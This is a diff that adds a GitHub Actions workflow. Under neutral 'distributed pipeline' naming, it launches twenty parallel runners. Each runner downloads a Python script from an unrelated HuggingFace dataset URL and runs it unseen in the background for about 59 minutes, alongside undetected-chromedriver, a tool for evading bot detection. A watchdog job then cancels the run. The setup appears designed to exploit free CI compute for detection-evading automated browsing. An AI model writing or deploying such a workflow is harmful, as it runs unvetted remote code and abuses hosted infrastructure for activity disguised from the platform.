@@ -1,0 +1,110 @@
+name: Apex Distributed Pipeline
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: apex-exec-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Job 1: Watchdog to cancel the workflow automatically after ~59 min
+  # =================================================================
+  system-watchdog:
+    name: "System Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      MAX_LIFESPAN: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo "Watchdog monitoring Run ID: ${{ github.run_id }}"
+          echo "Holding execution window for ${MAX_LIFESPAN} seconds..."
+
+          sleep "${MAX_LIFESPAN}"
+
+          echo "Time limit exceeded — issuing stop command via API..."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "Cancellation request sent successfully."
+
+  # =================================================================
+  # Job 2: Distributed worker nodes (Named Instances)
+  # =================================================================
+  cluster-agents:
+    name: "Agent-${{ matrix.node_tag }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_tag: 
+          - alpha-01
+          - alpha-02
+          - beta-01
+          - beta-02
+          - gamma-01
+          - gamma-02
+          - delta-01
+          - delta-02
+          - epsilon-01
+          - epsilon-02
+          - zeta-01
+          - zeta-02
+          - eta-01
+          - eta-02
+          - theta-01
+          - theta-02
+          - iota-01
+          - iota-02
+          - kappa-01
+          - kappa-02
+
+    steps:
+      - name: Prepare Machine
+        run: |
+          echo "Preparing system environment for Agent-${{ matrix.node_tag }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      - name: Retrieve Executable Component
+        run: |
+          echo "Fetching target script..."
+          curl -sL "https://huggingface.co/datasets/sjkhfuk/fofo/resolve/main/start.py" -o runtime_entry.py
+          echo "Target script retrieved."
+
+      - name: Install Runtime Dependencies
+        run: |
+          echo "Installing Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      - name: Run Core Module
+        run: |
+          echo "Starting module on Agent-${{ matrix.node_tag }}..."
+
+          python3 runtime_entry.py &
+          WORKER_PID=$!
+
+          echo "Module running in background [PID: ${WORKER_PID}]. Maximum run time set to 3540s."
+
+          sleep 3540
+
+          if kill -0 "$WORKER_PID" 2>/dev/null; then
+            echo "Reached threshold limit. Force killing PID: ${WORKER_PID}..."
+            kill -9 "$WORKER_PID"
+            echo "Process terminated."
+          else
+            echo "Process exited on its own prior to threshold."
+          fi
